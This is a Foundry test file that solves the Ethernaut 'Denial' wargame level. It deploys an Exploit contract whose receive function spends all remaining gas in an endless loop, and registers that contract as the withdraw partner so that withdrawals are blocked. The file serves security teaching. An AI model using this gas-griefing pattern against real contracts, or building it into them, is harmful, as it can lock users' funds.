// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Denial} from "../../src/20/Denial.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {DenialFactory} from "src/20/DenialFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract DenialTest is Test, BaseTest {
    Denial public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new DenialFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = Denial(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);
        Exploit exploit = new Exploit();

        instanceContract.setWithdrawPartner(address(exploit));

        vm.stopPrank();

    }
}

contract Exploit {
    uint256[] bigArray;
    // This will spend all remaining gas then revert
    receive() external payable {
        while (true) {
            bigArray.push(0);
        }
    }
}
